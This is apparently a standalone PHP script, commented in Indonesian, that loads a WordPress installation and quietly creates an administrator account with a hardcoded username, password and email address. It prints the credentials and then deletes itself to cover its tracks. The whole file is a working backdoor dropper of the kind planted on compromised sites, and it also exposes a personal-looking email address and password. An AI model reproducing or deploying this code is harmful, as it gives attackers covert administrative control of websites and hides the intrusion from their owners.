<?php
// TAMPILKAN ERROR SEMENTARA agar kita tahu kenapa 500 (hapus lagi setelah selesai)
@ini_set('display_errors', 1);
@ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Coba temukan wp-load.php dengan beberapa path relatif umum
$paths = [
    __DIR__ . '/../../wp-load.php',   // bila file di wp-content/something/
    __DIR__ . '/../wp-load.php',
    __DIR__ . '/wp-load.php',
    __DIR__ . '/../../../wp-load.php',
    dirname(__DIR__, 2) . '/wp-load.php'
];

$found = false;
foreach ($paths as $p) {
    if (file_exists($p)) {
        require_once($p);
        $found = true;
        break;
    }
}

if (!$found) {
    header("HTTP/1.1 500 Internal Server Error");
    echo "ERROR: wp-load.php tidak ditemukan. Coba pindahkan file ke folder root instalasi WordPress atau sesuaikan path require_once.\n";
    echo "Cek paths yang dicoba:\n";
    foreach ($paths as $p) echo "$p\n";
    exit;
}

// --- Data akun baru ---
$username = 'sabda_leluhur';
$password = 'akusangek12';
$email    = 'duayaayuhati@gmail.com';

if (!function_exists('username_exists')) {
    echo "ERROR: WordPress environment belum ter-load dengan benar.\n";
    exit;
}

if (username_exists($username) || email_exists($email)) {
    echo "⚠️ User sudah ada atau email sudah dipakai.";
} else {
    $user_id = wp_create_user($username, $password, $email);
    if (is_wp_error($user_id)) {
        echo "Gagal membuat user: " . $user_id->get_error_message();
        exit;
    }
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    echo "✅ BERHASIL DIBUAT<br>";
    echo "User ID: $user_id<br>";
    echo "Username: $username<br>";
    echo "Password: $password<br>";
    echo "Email: $email<br>";

    // Hapus file ini setelah sukses (auto-delete)
    $self = __FILE__;
    if (file_exists($self)) {
        @unlink($self);
        echo "<br>Script tmp-admin.php telah dihapus otomatis.";
    }
}
